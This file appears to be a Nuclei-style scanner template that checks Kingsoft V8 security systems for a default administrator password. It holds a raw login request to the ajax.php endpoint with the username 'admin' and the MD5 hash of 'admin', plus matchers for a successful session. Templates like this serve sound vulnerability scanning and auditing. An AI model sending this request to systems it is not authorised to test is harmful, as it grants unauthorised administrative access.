id: poc-yaml-kingsoft-v8-default-password
info:
  name: Kingsoft V8 Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: access-control-error
  description: |
    This template checks for the default password vulnerability in Kingsoft V8 systems.
http:
  - raw:
      - |
        POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"get_user_login_cmd":{"name":"admin","password":"21232f297a57a5a743894a0e4a801fc3"}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ADMIN"
          - "userSession"
